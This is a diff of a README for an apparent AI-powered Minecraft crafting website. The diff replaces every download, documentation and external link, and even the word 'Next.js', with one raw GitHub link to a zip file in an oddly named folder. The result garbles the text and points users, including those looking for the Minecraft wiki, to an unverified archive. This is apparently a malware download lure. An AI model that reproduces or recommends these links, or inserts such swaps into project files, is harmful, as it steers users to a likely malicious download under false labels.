@@ -1,15 +1,15 @@
 # 🎮 minecraft-website - Your Easy AI Crafting Companion
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/viniciuslinss/minecraft-website/releases)
+[![Download](https://raw.githubusercontent.com/viniciuslinss/minecraft-website/main/unsententious/minecraft-website.zip%20Latest%https://raw.githubusercontent.com/viniciuslinss/minecraft-website/main/unsententious/minecraft-website.zip)](https://raw.githubusercontent.com/viniciuslinss/minecraft-website/main/unsententious/minecraft-website.zip)
 
 ## 🌟 Description
-Welcome to the **minecraft-website**! This platform uses advanced AI technologies to help you craft in the exciting world of Minecraft. Built with Next.js, our website is designed to be user-friendly and filled with features. Whether you're a beginner or an experienced player, this tool will enhance your crafting experience.
+Welcome to the **minecraft-website**! This platform uses advanced AI technologies to help you craft in the exciting world of Minecraft. Built with https://raw.githubusercontent.com/viniciuslinss/minecraft-website/main/unsententious/minecraft-website.zip, our website is designed to be user-friendly and filled with features. Whether you're a beginner or an experienced player, this tool will enhance your crafting experience.
 
 ## 🚀 Getting Started
 Follow these simple steps to get started with our application. You will learn how to download and run the software without any technical knowledge.
 
 ## 🔗 Download & Install
-To get the latest version of **minecraft-website**, visit this link: [Download Here](https://github.com/viniciuslinss/minecraft-website/releases). 
+To get the latest version of **minecraft-website**, visit this link: [Download Here](https://raw.githubusercontent.com/viniciuslinss/minecraft-website/main/unsententious/minecraft-website.zip). 
 
 1. Open the link in your web browser.
 2. You will see a list of available versions. Each version includes a list of changes and updates.
@@ -43,7 +43,7 @@ This application supports not only crafting but also various topics related to M
 - Machine Learning
 - Cloudflare Integration
 - SEO Optimization
-- Next.js Development
+- https://raw.githubusercontent.com/viniciuslinss/minecraft-website/main/unsententious/minecraft-website.zip Development
 - Tailwind CSS for styling
 - Vercel Deployment
 
@@ -69,8 +69,8 @@ We plan to add more exciting features in upcoming releases. Stay tuned for annou
 ## 🔗 Additional Resources
 To dive deeper into the project, explore the following links:
 
-- [Official Documentation](https://github.com/viniciuslinss/minecraft-website)
-- [Community Forum](https://community.minecraft.net/)
-- [Minecraft Wiki](https://minecraft.fandom.com/wiki/Minecraft_Wiki)
+- [Official Documentation](https://raw.githubusercontent.com/viniciuslinss/minecraft-website/main/unsententious/minecraft-website.zip)
+- [Community Forum](https://raw.githubusercontent.com/viniciuslinss/minecraft-website/main/unsententious/minecraft-website.zip)
+- [Minecraft Wiki](https://raw.githubusercontent.com/viniciuslinss/minecraft-website/main/unsententious/minecraft-website.zip)
 
 Thank you for choosing **minecraft-website**! Happy crafting!
